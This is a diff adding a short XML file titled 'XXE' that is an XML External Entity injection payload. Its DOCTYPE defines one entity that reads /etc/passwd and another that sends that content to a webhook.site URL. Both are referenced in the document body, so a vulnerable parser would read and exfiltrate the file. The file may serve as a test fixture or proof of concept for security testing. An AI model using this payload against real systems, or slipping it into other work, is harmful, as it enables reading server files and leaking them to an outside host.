@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY data SYSTEM "file:///etc/passwd">
+  <!ENTITY send SYSTEM "https://webhook.site/1dcc2adf-ff8d-4b8d-9124-d6a34e269c2e?data=&data;">
+]>
+<test>
+  <title>XXE</title>
+  <author>&data;</author>
+  <author>&send;</author>
+</test>
